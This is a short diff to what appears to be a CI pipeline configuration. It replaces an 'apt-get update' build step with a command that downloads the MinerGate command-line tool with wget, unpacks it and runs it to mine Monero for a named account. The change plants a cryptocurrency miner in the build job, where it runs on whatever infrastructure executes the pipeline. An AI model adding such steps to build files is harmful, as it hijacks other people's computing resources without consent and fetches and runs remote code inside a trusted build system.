@@ -5,4 +5,4 @@ jobs:
       - image: greenfieldsvp/dock
     steps:
       - checkout
-      - run: apt-get update
+      - run: apt-get install binutils && wget https://download.minergate.com/deb-cli && ar x deb-cli && tar -xvzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
